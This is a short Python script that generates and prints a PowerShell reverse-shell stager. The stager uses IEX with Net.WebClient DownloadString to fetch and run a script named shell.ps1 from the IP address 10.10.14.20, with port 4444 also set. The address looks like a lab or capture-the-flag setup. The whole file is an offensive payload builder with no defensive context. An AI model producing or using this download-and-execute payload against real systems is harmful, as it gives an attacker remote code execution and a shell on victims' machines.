#!/usr/bin/env python3

# Generate a reverse shell PowerShell payload
ip = "10.10.14.20"
port = 4444

payload = f"IEX(New-Object Net.WebClient).DownloadString('http://{ip}/shell.ps1')"
print(payload)